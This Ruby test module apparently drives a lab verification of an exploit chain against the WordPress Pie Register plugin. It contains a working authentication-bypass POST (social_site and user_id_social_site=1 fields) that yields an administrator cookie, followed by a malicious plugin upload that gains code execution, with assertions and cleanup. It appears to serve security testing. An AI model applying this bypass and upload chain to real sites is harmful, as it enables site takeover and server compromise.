# frozen_string_literal: true

require 'nokogiri'
require 'rex/mime/message'
require 'rex/zip'
require_relative '../wp_batch_desync_rce/native'

# Use independent vendor login/upload controls with the shared bounded commands,
# callback, resource and reporting helpers. No core SQLi gate runs here.
module PieRegisterNative
  include WordpressBatchChainTarget

  def chain_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-pie-register.json'), JSON.pretty_generate(@chain)) if @chain
  end

  def chain_http(...)
    chain_request(...)
  end

  def chain_identity(label, *)
    output, = chain_command(label, 'app', 'php', '/opt/module-target/control.php', *)
    data = JSON.parse(output)
    (@chain[:identities] ||= []) << { label: label, data: data }
    chain_save
    expect(data.values_at('core', 'php', 'uid', 'version', 'database', 'role')).to eq(['6.8.3', '8.3.28', 33, @release, 'wp_root', 'module_target@%'])
    expect(data.fetch('server')).to start_with('11.2.2-MariaDB')
    expect(data.fetch('grants').join("\n")).not_to include('ALL PRIVILEGES ON *.*', 'GRANT OPTION')
    expect(data.values_at('db_error', 'bootstrap_output_base64')).to eq(['', ''])
    expect(data.fetch('archive_sha256')).to eq(@catalog.fetch('sha256'))
    expect(data.fetch('installed_sha256')).to eq(@catalog.fetch('installed_sha256'))
    expect(data.values_at('active_plugins', 'class_loaded', 'native_init_handler')).to eq([['pie-register/pie-register.php'], true, true])
    expect(data.values_at('home', 'siteurl')).to eq(['http://module-target.test' + @prefix] * 2)
    expect(data.fetch('permalink_structure').empty?).to eq(ENV.fetch('PIE_PLAIN', '0') == '1')
    %w[plugins upload_base upload_current].each do |key|
      expect(data.fetch('filesystem').fetch(key).values_at('uid', 'writable')).to eq([33, true])
    end
    expect(data.fetch('filesystem').fetch('upload_error')).to be(false)
    expect(data.fetch('filesystem').fetch('disk_free_bytes')).to be > 16_777_216
    data
  end

  def chain_assert_restored(current, original = @baseline)
    expect(pr_selected_state(current)).to eq(pr_selected_state(original))
  end

  def pr_selected_state(identity)
    identity.except('filesystem', 'operation_result')
  end

  def pr_fields(response)
    Nokogiri::HTML(response.body).css('input[name]').to_h { |input| [input['name'], input['value'].to_s] }
  end

  def pr_cookies(response)
    # Later Set-Cookie headers replace earlier tokens with the same name.
    Array(response.get_fields('set-cookie')).to_h { |text| text.split(';', 2).first.split('=', 2) }.map { |name, value| name + '=' + value }.join('; ')
  end

  def pr_cookie_identity(label, response)
    values = Array(response.get_fields('set-cookie')).filter_map do |text|
      next unless text.start_with?('wordpress_logged_in_')

      text.split(';', 2).first.split('=', 2).last
    end
    cookie = URI.decode_www_form_component(values.reverse.find { |value| !value.empty? }.to_s)
    chain_identity(label + '-cookie', 'cookie', Base64.strict_encode64(cookie)).fetch('operation_result').fetch('validated_user_id')
  end

  def pr_clear_sessions(label, agent)
    current = chain_identity(label + '-before')
    current.fetch('users').each do |user|
      next if user.fetch('sessions').empty?

      expect(user.fetch('sessions').map { |session| session.fetch('ua') }).to all(eq(agent))
      cleared = chain_identity(label + '-' + user.fetch('user_login'), 'clear-sessions', user.fetch('user_login'), agent)
      @chain.fetch(:operator_cleanup) << { label: label, result: cleared.fetch('operation_result') }
    end
    # The vendor creates session metadata before validating a numeric user ID.
    identifiers = current.fetch('users').map { |user| user.fetch('ID') }
    current.fetch('usermeta').reject { |entry| identifiers.include?(entry.fetch('user_id').to_i) }.each do |entry|
      expect(entry.values_at('user_id', 'meta_key')).to eq(['424242', 'session_tokens'])
      cleared = chain_identity(label + '-orphan', 'clear-orphan-sessions', entry.fetch('user_id'), agent)
      @chain.fetch(:operator_cleanup) << { label: label, result: cleared.fetch('operation_result') }
    end
    chain_save
    chain_identity(label + '-after')
  end

  def pr_admin_page(label, cookie, agent, allowed: true)
    response = chain_http(label, @prefix + '/wp-admin/users.php', headers: { 'Cookie' => cookie, 'User-Agent' => agent })
    if allowed
      expect(response.code).to eq('200')
      expect(Nokogiri::HTML(response.body).at_css('tr#user-1')&.text).to include('module_admin')
    else
      expect(%w[302 403]).to include(response.code)
    end
  end

  def pr_native_plugin(label, cookie, agent)
    path = @prefix + '/wp-content/plugins/native_pie_probe/native-proof.php'
    expect(chain_http(label + '-absent', path).code).to eq('404')
    upload = chain_http(label + '-upload-form', @prefix + '/wp-admin/plugin-install.php?tab=upload', headers: { 'Cookie' => cookie, 'User-Agent' => agent })
    expect(upload.code).to eq('200')
    source = File.binread(File.join(__dir__, 'probe-plugin.php'))
    archive = Rex::Zip::Archive.new
    archive.add_file('native_pie_probe/native-proof.php', source)
    multipart = Rex::MIME::Message.new
    multipart.add_part(pr_fields(upload).fetch('_wpnonce'), nil, nil, 'form-data; name="_wpnonce"')
    multipart.add_part('Install Now', nil, nil, 'form-data; name="install-plugin-submit"')
    multipart.add_part(archive.pack, 'application/zip', 'binary', 'form-data; name="pluginzip"; filename="native-pie.zip"')
    response = chain_http(label + '-upload', @prefix + '/wp-admin/update.php?action=upload-plugin', multipart.to_s, raw: true, headers: { 'Cookie' => cookie, 'User-Agent' => agent, 'Content-Type' => 'multipart/form-data; boundary=' + multipart.bound })
    expect(response.code).to eq('200')
    proof = chain_http(label + '-execution', path)
    expect(proof.code).to eq('200')
    data = JSON.parse(proof.body)
    expect(data.values_at('marker', 'uid', 'bash')).to eq(['MODULE_TARGET_NATIVE_PIE_PROOF', 33, true])
    expect(data.fetch('shell')).to start_with('uid=33(')
    (@chain[:native_execution] ||= []) << { label: label, **data }
    chain_identity(label + '-plugin-removed', 'delete-plugin', Digest::SHA256.hexdigest(source))
  end

  def chain_native_gate(phase)
    original = chain_identity(phase + '-identity')
    expect(original.fetch('users').map { |user| user.fetch('sessions') }).to all(eq([]))
    expect(chain_http(phase + '-home', @prefix + '/').code).to eq('200')
    readme = chain_http(phase + '-readme', @prefix + '/wp-content/plugins/pie-register/readme.txt')
    expect(readme.code).to eq('200')
    expect(readme.body).to include(@release)
    agent = "module-target-pie-native-#{Process.pid}-#{phase}-password"
    route = @prefix + '/wp-login.php'
    login = chain_http(phase + '-password-form', route, headers: { 'User-Agent' => agent })
    cookie = pr_cookies(login)
    if login.code == '302'
      location = URI(login.fetch('location'))
      expect([nil, 'module-target.test', '127.0.0.1']).to include(location.host)
      route = location.path.to_s.empty? ? '/' : location.path
      route += '?' + location.query if location.query
      login = chain_http(phase + '-plugin-login-form', route, headers: { 'Cookie' => cookie, 'User-Agent' => agent })
      cookie = [cookie, pr_cookies(login)].reject(&:empty?).join('; ')
    end
    expect(login.code).to eq('200')
    fields = pr_fields(login)
    expect(fields.keys).to include('log', 'pwd')
    parameters = fields.except('log', 'pwd', 'rememberme').merge('log' => 'module_admin', 'pwd' => 'module-target-password')
    response = chain_http(phase + '-password-login', route, parameters, form: true, headers: { 'Cookie' => cookie, 'User-Agent' => agent })
    expect(pr_cookie_identity(phase + '-password', response)).to eq(1)
    cookie = pr_cookies(response)
    pr_admin_page(phase + '-password-admin', cookie, agent)
    pr_native_plugin(phase + '-password-native', cookie, agent)
    chain_assert_restored(pr_clear_sessions(phase + '-password-clear', agent), original)

    agent = "module-target-pie-native-#{Process.pid}-#{phase}-numeric"
    response = chain_http(phase + '-numeric-bypass', @prefix + '/', { 'log' => 'native_invalid_identity', 'pwd' => 'native_invalid_password', 'social_site' => 'true', 'user_id_social_site' => '1', 'piereg_login_after_registration' => 'true' }, form: true, headers: { 'User-Agent' => agent })
    expect(pr_cookie_identity(phase + '-numeric', response)).to eq(@affected ? 1 : false)
    cookie = pr_cookies(response)
    pr_admin_page(phase + '-numeric-admin', cookie, agent, allowed: @affected)
    if @affected
      pr_native_plugin(phase + '-numeric-native', cookie, agent)
      chain_assert_restored(pr_clear_sessions(phase + '-numeric-clear', agent), original)
    else
      refusal = chain_http(phase + '-numeric-upload-denied', @prefix + '/wp-admin/plugin-install.php?tab=upload', headers: { 'Cookie' => cookie, 'User-Agent' => agent })
      expect(%w[302 403]).to include(refusal.code)
      agent = "module-target-pie-native-#{Process.pid}-#{phase}-username"
      separate = chain_http(phase + '-separate-username', @prefix + '/', { 'log' => 'module_admin', 'pwd' => 'native_invalid_password', 'social_site' => 'true' }, form: true, headers: { 'User-Agent' => agent })
      expect(pr_cookie_identity(phase + '-separate-username', separate)).to eq(@release == '3.7.1.5' ? 1 : false)
      pr_clear_sessions(phase + '-username-clear', agent) if @release == '3.7.1.5'
    end
    chain_assert_restored(chain_identity(phase + '-native-cleanup'), original)
    callback = chain_callback_probe
    chain_resources(phase, %w[app db reporting_db])
    @chain.fetch(:controls) << { phase: phase, genuine_password_login_and_execution: true, numeric_bypass: @affected, separate_username_bypass: @release == '3.7.1.5', passed: true }
    chain_save
    [original, callback]
  end
end
